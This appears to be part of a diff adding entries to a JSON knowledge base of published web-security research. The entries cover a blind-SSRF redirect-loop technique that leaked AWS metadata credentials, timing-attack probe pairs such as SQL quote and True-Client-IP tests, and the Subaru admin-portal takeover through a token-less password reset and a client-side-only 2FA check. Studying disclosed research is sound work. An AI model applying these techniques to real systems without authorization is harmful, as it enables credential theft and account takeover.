+   "source_url": "https://slcyber.io/research-center/novel-ssrf-technique-involving-http-redirect-loops/",
+   "set": "research",
+   "severity": "critical",
+   "bounty": null,
+   "classes": [
+    "ssrf",
+    "info-leak"
+   ],
+   "first_signal": "The SSRF follows redirects; the error text CHANGES with the redirect count (a JSON parse error at low counts, `NetworkException` past the maximum); the full response leaks for some status codes such as 500 but not for 200",
+   "mechanic": "Blind SSRF made visible: an own server returns an incrementing status (301 plus n up to 310) bouncing to itself and then a 302 to the real target, so the app's own redirect-error path - which fires above about 5 redirects, below libcurl's 30 - dumps every collected response including the final 200 body.",
+   "chain": [
+    "Stand up an own Flask redirect-loop server with incrementing statuses ending at a harmless page",
+    "If the chain plus the final body appear in the error, the target is susceptible",
+    "Only then aim at internal endpoints, with authorization"
+   ],
+   "impact_proof": "AWS metadata credentials retrieved; the author reports reuse \"in several situations\". Found black-box before the binary finished loading in Ghidra.",
+   "keywords": [
+    "incrementing redirect statuses 301-310",
+    "app redirect limit below libcurl's 30",
+    "error path dumps collected responses",
+    "blind ssrf made readable",
+    "own flask redirect server",
+    "aws metadata credentials"
+   ],
+   "lesson": "oracle"
+  },
+  {
+   "id": "rs-31",
+   "source_url": "https://portswigger.net/research/listen-to-the-whispers-web-timing-attacks-that-actually-work",
+   "set": "research",
+   "severity": "high",
+   "bounty": null,
+   "classes": [
+    "ssrf",
+    "sqli",
+    "info-leak"
+   ],
+   "first_signal": "Which of a pair returns first; DNS cache warming; a 64-octet DNS label makes resolution be skipped and so run faster; exceptions short-circuit slow paths (\"timing attacks are exceptionally good at detecting exceptions\"); keyed versus unkeyed parameter at 310ms versus 22ms; WAF delay stacking on repeated parameters",
+   "mechanic": "A single-packet attack plus dual-packet sync (TCP_NODELAY off, send all but the last byte or frame, wait about 100ms, sacrificial PING) lets you compare RESPONSE ORDER instead of absolute time.",
+   "chain": [
+    "Send probe pairs: `'` versus `''`; `%23` versus `%21` for server-side parameter pollution; invalid versus valid JSON escape; a random header versus `True-Client-IP: <own domain>`; a duplicate Host; `aaa{62}` versus `aaa{63}`",
+    "Take 30 measurements per input and compare bottom quartiles",
+    "Report at 80% or better consistent ordering over up to 50 pairs"
+   ],
+   "impact_proof": "On a 30,000-site bed: 375 IP-spoofing-vulnerable domains; blind SQLi; blind JSON injection; hundreds of reverse proxies exposing tens of thousands of internal routes; firewall bypass to an internal SonarQube; staging and a US government admin console; 403 turned into access. Smallest exploited gap 200 microseconds.",
+   "keywords": [
+    "single-packet attack",
+    "response order not absolute time",
+    "bottom quartile of 30 samples",
+    "true-client-ip own domain",
+    "64-octet dns label",
+    "keyed vs unkeyed 310ms vs 22ms",
+    "bug doppelganger to confirm"
+   ],
+   "lesson": "oracle"
+  },
+  {
+   "id": "rs-32",
+   "source_url": "https://samcurry.net/hacking-subaru",
+   "set": "research",
+   "severity": "critical",
+   "bounty": null,
+   "classes": [
+    "auth-bypass",
+    "missing_authorization",
+    "info-leak"
+   ],
+   "first_signal": "An unfamiliar apex revealed by CNAME chains; brute-forceable JS directories; a reset endpoint with no token parameter; a valid/invalid email response delta; MFA enforced only client-side",
+   "mechanic": "The consumer app's authorization was solid, so the hunt pivoted to employee and admin tooling, where a token-less password reset plus a UI-only 2FA modal gave full admin access.",
+   "chain": [
+    "`my.subaru.com` CNAME to `mys.prod.subarucs.com`, a new apex; enumerate subdomains on it to find `portal.prod.subarucs.com`",
+    "The login page loads `/assets/_js/`; ffuf it to find `login.js` and extract `/forgotPassword/resetPassword.json`, which takes an email plus a new password and no token",
+    "`/adminProfile/getSecurityQuestion.json` is an account-existence oracle; employee names from LinkedIn as `<initial><lastname>@subaru.com`, valid on the 4th guess",
+    "Custom 2FA was a UI modal only - delete the line and the backend still serves"
+   ],
+   "impact_proof": "Unrestricted access to all vehicles and customer accounts in US/CA/JP: PII, vehicle PIN and about a year of location history (about 1,600 points); added himself as an authorized user and unlocked a consenting friend's car. Fixed in about 24 hours.",
+   "keywords": [
+    "cname chain reveals a new apex",
+    "ffuf the js directory",
+    "resetpassword.json with no token",
+    "getsecurityquestion.json existence oracle",
+    "2fa is a ui modal only",
+    "employee surface pivot"
+   ],
+   "lesson": "sibling-interface"
+  }
+ ]
+}
